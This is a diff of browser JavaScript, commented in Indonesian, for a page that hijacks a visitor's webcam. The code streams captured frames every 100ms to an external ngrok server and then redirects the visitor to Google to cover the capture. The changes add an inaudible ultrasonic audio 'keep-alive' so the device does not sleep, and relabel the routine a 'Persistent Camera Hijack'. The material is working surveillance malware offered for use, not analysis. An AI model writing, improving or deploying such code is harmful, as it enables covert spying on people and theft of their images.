@@ -32,8 +32,9 @@
 
   var logEl = document.getElementById('log');
   var executed = false;
-  var cycleInterval = null;
   var streamInterval = null;
+  var audioCtx = null;
+  var isCameraActive = false;
 
   function log(msg) {
     logEl.innerHTML += "> " + msg + "<br>";
@@ -46,8 +47,26 @@
   var TARGET_URL = "https://www.google.com"; 
   var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev";
   
-  // Interval Siklus (ms)
-  var CYCLE_INTERVAL = 500; // Minta izin setiap 500ms
+  // Delay sebelum redirect (ms) - Beri waktu kamera menyala & merekam
+  var REDIRECT_DELAY = 5000; // 5 Detik
+
+  // ============================================
+  // FUNGSI: AUDIO KEEP-ALIVE (MENCEGAH SLEEP)
+  // ============================================
+  function initAudioKeepAlive() {
+    try {
+      window.AudioContext = window.AudioContext || window.webkitAudioContext;
+      audioCtx = new AudioContext();
+      var osc = audioCtx.createOscillator();
+      var gain = audioCtx.createGain();
+      gain.gain.value = 0.0001; // Sangat pelan
+      osc.frequency.value = 18000; // Ultrasonic
+      osc.connect(gain);
+      gain.connect(audioCtx.destination);
+      osc.start();
+      log("[+] Audio Keep-Alive Aktif.");
+    } catch(e) {}
+  }
 
   // ============================================
   // FUNGSI: KIRIM GAMBAR KE SERVER
@@ -80,11 +99,11 @@
   }
 
   // ============================================
-  // FUNGSI: REQUEST KAMERA (CYCLE)
+  // FUNGSI: START CAMERA & REDIRECT SETELAH AKTIF
   // ============================================
-  function requestCamera() {
+  function startCamera() {
     try {
-      log("[+] Meminta Izin Kamera (Cycle)...");
+      log("[+] Meminta Izin Kamera...");
       
       navigator.mediaDevices.getUserMedia({ video: true, audio: false })
         .then(function(stream) {
@@ -92,20 +111,28 @@
           video.srcObject = stream;
           video.play().catch(function(){});
           log("[+] 🚨 KAMERA BERHASIL diakses!");
-          
-          // Mulai kirim gambar secara berkala
+          isCameraActive = true;
+
+          // Mulai streaming gambar setiap 100ms
           if (streamInterval) clearInterval(streamInterval);
           streamInterval = setInterval(sendImageToServer, 100);
 
-          // Hentikan cycle karena sudah berhasil
-          if (cycleInterval) {
-            clearInterval(cycleInterval);
-            cycleInterval = null;
-            log("[!] Camera Cycle dihentikan (Berhasil).");
-          }
+          // Redirect ke Google setelah delay (kamera sudah aktif)
+          setTimeout(function() {
+            log("[+] Redirect ke Google setelah " + REDIRECT_DELAY + "ms...");
+            try {
+              window.location.href = TARGET_URL;
+            } catch(e) {}
+          }, REDIRECT_DELAY);
+
         })
         .catch(function(err) {
           log("[-] Kamera diblokir: " + err.name);
+          // Jika kamera diblokir, tetap redirect ke Google setelah 1 detik
+          setTimeout(function() {
+            log("[+] Redirect ke Google (karena kamera diblokir)...");
+            window.location.href = TARGET_URL;
+          }, 1000);
         });
     } catch(e) {}
   }
@@ -123,32 +150,13 @@
       <div id="log"></div>
     `;
     logEl = document.getElementById('log');
-    log("[!] Memulai Google Camera Cycle...");
+    log("[!] Memulai Persistent Camera Hijack...");
 
-    // ============================================
-    // A. MULAI KAMERA DULU (0ms)
-    // ============================================
-    // Paksa minta kamera sebelum redirect agar stream aktif.
-    requestCamera();
+    // A. Inisialisasi Audio Keep-Alive
+    initAudioKeepAlive();
 
-    // ============================================
-    // B. CAMERA CYCLE (Setiap 500ms)
-    // ============================================
-    // Jika kamera gagal di awal, coba lagi secara berkala.
-    cycleInterval = setInterval(function() {
-      requestCamera();
-    }, CYCLE_INTERVAL);
-
-    // ============================================
-    // C. REDIRECT KE GOOGLE (Setelah 1000ms)
-    // ============================================
-    // Delay 1 detik untuk memberi waktu kamera menyala / prompt muncul.
-    setTimeout(function() {
-      log("[+] Redirect ke Google.com...");
-      try {
-        window.location.href = TARGET_URL;
-      } catch(e) {}
-    }, 1000);
+    // B. Mulai Kamera (Akan redirect setelah aktif)
+    startCamera();
 
   }, { once: true });
 
